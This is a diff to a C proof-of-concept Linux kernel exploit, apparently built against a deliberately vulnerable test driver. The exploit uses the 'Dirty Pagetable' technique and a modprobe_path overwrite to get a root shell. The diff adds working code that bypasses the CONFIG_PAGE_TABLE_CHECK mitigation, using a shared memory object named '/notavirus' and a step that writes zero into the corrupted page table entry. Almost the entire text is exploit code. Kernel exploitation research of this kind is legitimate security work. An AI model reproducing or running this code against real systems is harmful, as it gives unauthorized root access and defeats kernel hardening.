@@ -11,6 +11,9 @@
  *
  * This PoC performs the Dirty Pagetable attack via huge pages and gains LPE.
  *
+ * You may also compile the kernel with CONFIG_PAGE_TABLE_CHECK and CONFIG_TRANSPARENT_HUGEPAGE,
+ * since this PoC can bypass them combined.
+ *
  * Requirements:
  *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
  *  2) Ensure that KERNEL_TEXT_PATTERNS contains the first bytes of _text of your kernel
@@ -127,10 +130,30 @@ int act(int act_fd, int code, int n, char *args)
 
 int prepare_page_tables(void)
 {
+	int fd = -1;
 	unsigned long *addr = NULL;
 	long i = 0;
 
 	printf("[!] preparing page tables\n");
+
+	/*
+	 * Let's use POSIX shared memory to keep the memory mapping
+	 * after the exploit process finishes. That is needed to bypass
+	 * the CONFIG_PAGE_TABLE_CHECK mitigation.
+	 */
+	fd = shm_open("/notavirus", O_CREAT | O_RDWR, 0666);
+	if (fd < 0) {
+		perror("[-] shm_open");
+		return EXIT_FAILURE;
+	}
+
+	/* Set the size of the created shared memory object */
+	if (ftruncate(fd, PAGE_SIZE) < 0) {
+		perror("[-] ftruncate");
+		return EXIT_FAILURE;
+	}
+
+	printf("[+] shared memory object is created\n");
 
 	/*
 	 * Prepare the resources for PUD that will later reclaim
@@ -138,13 +161,13 @@ int prepare_page_tables(void)
 	 */
 	for (i = 0; i < PT_ENTRIES; i++) {
 		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
-			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+			    MAP_FIXED | MAP_SHARED, fd, 0);
 		if (addr == MAP_FAILED) {
 			perror("[-] mmap");
 			return EXIT_FAILURE;
 		}
 	}
-	printf("[+] mmap one KiB in each PUD entry: from %p to %p\n",
+	printf("[+] mmap 4 KiB for each PUD entry: from %p to %p\n",
 			PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0),
 			PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0));
 
@@ -286,9 +309,15 @@ int is_kernel_text(void *addr)
 	char *patterns[] = KERNEL_TEXT_PATTERNS;
 	size_t n = sizeof(patterns) / sizeof(char *);
 	size_t i = 0;
+	size_t j = 0;
+	char *bytes = addr;
 
 	for (i = 0; i < n; i++) {
-		if (memcmp(addr, patterns[i], KERNEL_TEXT_PATTERN_LEN) == 0)
+		for (j = 0; j < KERNEL_TEXT_PATTERN_LEN; j++) {
+			if (bytes[j] != patterns[i][j])
+				break;
+		}
+		if (j == KERNEL_TEXT_PATTERN_LEN)
 			return 1;
 	}
 	return 0;
@@ -565,7 +594,7 @@ int main(void)
 	/* Start from the first GiB of physical memory */
 	ret = pud_write(phys_addr, uaf_n, act_fd);
 	if (ret == EXIT_FAILURE)
-		goto end;
+		goto repair;
 
 	for (i = 0; i < PT_ENTRIES; i++) {
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0);
@@ -585,7 +614,7 @@ int main(void)
 				phys_addr += PUD_SIZE;
 				ret = pud_write(phys_addr, uaf_n, act_fd);
 				if (ret == EXIT_FAILURE)
-					goto end;
+					goto repair;
 			}
 
 			/*
@@ -612,10 +641,19 @@ int main(void)
 		/* Launch the root shell */
 		trigger_modprobe_sock();
 		result = EXIT_SUCCESS;
-		goto end; /* root shell is finished */
+		goto repair; /* root shell is finished */
 	}
 
 	printf("[-] failed to find / overwrite / trigger modprobe\n");
+
+repair:
+	/*
+	 * Bypass the CONFIG_PAGE_TABLE_CHECK on page table freeing.
+	 * To do so, write 0 to the corrupted page table entry
+	 * to make pud_none_or_clear_bad() called in zap_pud_range().
+	 * That allows to skip the checks.
+	 */
+	act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, "0x0 0");
 
 end:
 	if (act_fd >= 0) {
